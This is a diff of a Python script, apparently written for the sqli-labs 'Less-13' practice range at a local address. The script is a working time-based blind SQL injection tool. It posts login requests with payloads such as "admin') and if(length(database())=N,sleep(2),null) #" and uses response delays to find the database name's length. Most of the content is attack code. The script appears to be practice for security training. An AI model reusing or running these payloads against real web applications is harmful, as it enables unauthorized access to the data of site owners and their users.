@@ -1,43 +1,52 @@
 import requests
 import time
 
-
-
-
-def send_payload(base_url,payload,headers=None):
-    
-    data= {
-        "username":payload, #记得变量名要和题目保持一直哦
-        "password":"123456" #这个可以随便写
+def send_payload(url, payload, headers=None):
+    data = {
+        "uname": payload,  
+        "passwd": "123456",  
+        "Submit": "Submit"
     }
-    url = base_url.format(payload=payload)
-    try:
-        response = requests.post(url, data=data,headers=headers,timeout=10)
-        print(f"[+]状态码:{response.status_code}")
-        print(f"[+]响应时长:{response.elapsed.total_seconds():.2f}s")
-        print(f"[+]相应内容:\n{response.text[:300]}...")
-        return response
-    except Exception as e:
-        print(f"[!]请求失败:{e}")
-        return None
     
-if __name__ == "_main_":
-    conn = requests.session()
-    #时间盲住post型的文件
-    #这里是配置文件
-    base_url = 'http://172.17.0.2/Less-13/?id = 1 {payload} --+ '
+    print("正在尝试注入")
+    try:
+        start = time.time()
+        response = requests.post(url, data=data,timeout=10)
+        duration = time.time() - start
 
-    #请求头
+        print(f"[+] 状态码: {response.status_code}")
+        print(f"[+] 响应时长: {duration:.2f}s")
+        return duration
+    except Exception as e:
+        print(f"[!] 请求失败: {e}")
+        return None
+def DBname():
+    length  = 0
+    print("正在获取数据库名称")
+    for i in range(1,50):
+       payload = f"admin') and if(length(database())={i},sleep(2),null) #"
+       print(f"尝试{i}....")
+       duration  = send_payload(url,payload,headers=headers)
+       if duration  and duration > 2:
+           print(f"数据库的长度为{i}")
+           length  = i
+           break
+    
+if __name__ == "__main__":
+    session = requests.session()
+
+    # 靶场地址（不要把 payload 放在 URL 里，因为这是 POST）
+    url = 'http://172.17.0.2/Less-13/'  # 视实际而定
+
+    # 请求头
     headers = {
-           "Content-Type: application/x-www-form-urlencoded"
-        }
-    test_paylaod = '\') and sleep(5)--+'
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
 
-    star_char = 32
-    end_char = 126
-    #自行设置返回时间
-    time = ''
-    #检测长度范围
-    send_payload(base_url,test_paylaod,headers=headers)
+    # 时间盲注 payload 示例
+    test_payload = "admin') and sleep(2) #"
 
+   
 
+    DBname()
+    
